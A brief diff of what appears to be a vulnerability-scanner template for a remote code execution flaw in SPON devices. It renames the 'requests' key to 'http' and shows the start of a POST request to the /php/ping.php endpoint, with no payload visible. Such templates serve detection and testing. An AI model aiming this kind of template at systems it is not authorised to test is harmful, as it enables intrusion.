@@ -7,7 +7,7 @@ info:
   reference: https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=4578
   tags: SPON,rce
 
-requests:
+http:
   - raw:
       - |
         POST /php/ping.php HTTP/1.1
